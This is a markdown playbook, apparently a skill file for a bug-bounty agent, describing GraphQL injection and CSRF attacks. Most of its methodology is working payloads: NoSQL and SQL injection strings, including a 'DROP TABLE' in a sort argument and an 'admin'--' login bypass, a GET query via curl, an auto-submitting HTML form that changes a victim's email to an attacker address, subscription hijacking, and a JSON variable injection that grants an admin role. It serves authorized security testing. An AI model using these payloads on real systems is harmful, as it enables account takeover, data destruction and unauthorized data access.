---
name: attack-graphql-injection
description: "GraphQL injection & CSRF — NoSQL/SQL via arguments, GET-based queries, CSRF on mutations, subscription abuse, JSON injection"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - graphql
  - injection
  - csrf
  - nosql
tech_stack:
  - graphql
cwe_ids:
  - CWE-89
  - CWE-352
chains_with:
  - attack-graphql
  - attack-request-smuggling
prerequisites:
  - attack-graphql
---

# GraphQL Injection & CSRF

## Objective

Arguments flow into backend queries (SQL/NoSQL/Mongo filters), some stacks accept
GET-encoded GraphQL (CSRF-ready), and mutations without CSRF tokens die the same way
REST does — with GraphQL-specific delivery twists.

## Methodology

### 1. Argument injection → backend query

```text
{ users(filter:"$where: '1=1'") }        ← mongo filter string passed through
{ users(where:"1=1") }                   ← SQL fragment in a custom filter arg
{ login(user:"admin'--", pass:"x") }     ← SQLi via string arg
{ users(sort:"email); DROP TABLE--") }   ← sort/orderBy args reach SQL ORDER BY
```

Test args that look like DSL: `filter`, `where`, `sort`, `orderBy`, `search` — these
often skip the parameterization layer. NoSQL: `{"$ne":null}`, regex `.*` in filter JSON.

### 2. GET-based GraphQL (CSRF primitive)

```bash
curl "https://TARGET/graphql?query={user(id:1){email}}"
# Accepts GET = any cross-site <img>/<form> triggers authenticated queries/mutations
```

### 3. CSRF on mutations (no token = ATO chain)

```html
<!-- No CSRF token + cookies + GET/json simple → auto-submitting form -->
<form action="https://TARGET/graphql" method="POST">
  <input name="query" value='mutation { changeEmail(email:"attacker@x.com") { ok } }'>
</form>
<script>document.forms[0].submit()</script>
```

- POST JSON only + SameSite=Lax usually blocks it — test text/plain form encoding
  bypass (server parses JSON anyway on some stacks)
- Pair with attack-account-takeover when a sensitive mutation works

### 4. Subscription abuse

```text
wss://TARGET/graphql (graphql-ws) — connect and subscribe to OTHER users' channels
when the subscription authz misses: live data leak (pair attack-websocket)
```

### 5. JSON injection via variables

```json
{"variables":{"email":"x\",\"role\":\"admin"}}
```

Some resolvers interpolate variables into strings server-side → structure confusion.

## Proof

- Injection: backend error text / differential response with payload vs baseline
- CSRF: proof-of-concept hosted page + victim-session execution evidence (screenshot
  of the change applied from a cross-site origin)
- Name the transport (GET/form/json) — the fix differs per transport

## Notes

- GraphQL introspection is your injection map: every `filter`-like arg in the schema is
  a candidate — enumerate them all before hand-crafting
